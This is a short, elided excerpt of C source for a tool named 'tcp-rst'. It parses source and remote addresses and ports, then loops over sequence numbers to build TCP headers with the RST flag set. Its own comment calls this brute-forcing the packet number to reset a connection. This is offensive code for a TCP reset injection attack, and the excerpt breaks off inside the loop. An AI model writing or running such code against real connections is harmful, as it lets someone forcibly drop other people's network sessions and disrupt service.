...
int main(int argc,char* argv[]){
    if(argc!=9){fprintf(stdout,"Usage: tcp-rst --source-addr saddr --remote-addr raddr --source-port port --remote-port port\n");exit(0);}
	else{	
		...
		/** Application (Flag RST ON,bruteforce at packet number and source port guessed) **/
		unsigned int i,count=0;
		for(i=0;i<65535;i++){
			set_tcp_header(tcp_hdr,source_port,remote_port,i,0,TCP_DEFAULT_OFFSET,TCP_DEFAULT_RESERVED,0,0,1,0,0,0,0,0, \
			       TCP_DEFAULT_WINDOW,0,0,buffer);
			if(i==0){ fprintf(stdout,"Aprox: \n"); SHOW_CREATED_TCP_HEADER(tcp_hdr); }
